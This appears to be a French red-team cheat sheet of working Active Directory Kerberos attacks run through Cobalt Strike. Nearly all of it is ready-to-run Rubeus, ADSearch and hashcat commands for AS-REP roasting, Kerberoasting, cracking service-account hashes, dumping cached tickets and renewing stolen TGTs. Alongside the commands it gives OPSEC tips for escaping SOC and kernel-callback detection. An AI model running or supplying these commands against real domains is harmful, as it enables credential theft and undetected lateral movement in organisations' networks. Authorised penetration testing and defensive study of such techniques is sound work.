

# AS-REP Roasting (T1558.004)

## Cobalt Strike

avec Rubeus

> [!Warning]
> Fait une requete de TGS pour tous les utilisateurs. Non recommandé vis à vis de l'OPSEC.
> De plus les tickets sont requêtés au format RC4 qui est n'est plus utilisé aujourd'hui donc très visible coté SOC.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap
```

crack avec hashcat mode 18200

```
.\hashcat.exe -a 0 -m 18200 .\asrep.hash .\example.dict -r .\rules\dive.rule
```

Meilleure approche -> Enumérer les utilisateurs ayant le DONT_REQUIRE_PREAUTH dans un premier temps et cibler la requête après.


# Kerberoasting (T1558.003)

## Cobalt Strike

avec Rubeus

> [!Warning]
> Fait une requete de TGS pour tous les utilisateurs. Non recommandé vis à vis de l'OPSEC.
> De plus les tickets sont requêtés au format RC4 qui est n'est plus utilisé aujourd'hui donc très visible coté SOC.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /format:hashcat /simple
```

crack avec hashcat mode 13100

```
.\hashcat.exe -a 0 -m 13100 .\kerb.hash .\example.dict -r .\rules\dive.rule
```

Meilleure approche -> Enumérer les utilisateurs ayant un SPN dans un premier temps et cibler la requête après.

```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe -s "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" --attributes cn,samaccountname,serviceprincipalname
```

Kerberoast sur un user

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:<samaccountname> /nowrap
```

ou sur un spn

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /spn:<spn> /nowrap
```


# Extraire les tickets en cache

> [!TIP]
> Requiert les privilèges SYSTEM.
> Meilleur d'un point de vue OPSEC que dump LSASS -> non logué par les kernel callbacks.

## Cobalt Strike

avec Rubeus

afficher tous les tickets

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
```

Dump un ticket

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0xd42c80 /service:krbtgt /nowrap
```

Dump tous les tickets

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /nowrap
```



# Renouveler TGT

Les tickets contiennent une date de début, date de fin (10h après date de début par défaut) et sont renouvelable jusqu'à une certaine date (7 jours après date de début par défaut).

> [!Warning]
> Ne fonctionne pas si le user fait parti du groupe Protected User qui calque la durée de renouvellement du ticket sur sa durée de vie -> 4h par défaut.

## Cobalt Strike

avec Rubeus

Afficher les infos du ticket

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFq[...snip...]uQ09N
```

renouveler un ticket

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe renew /ticket:doIFq[...snip...]uQ09N /nowrap
```



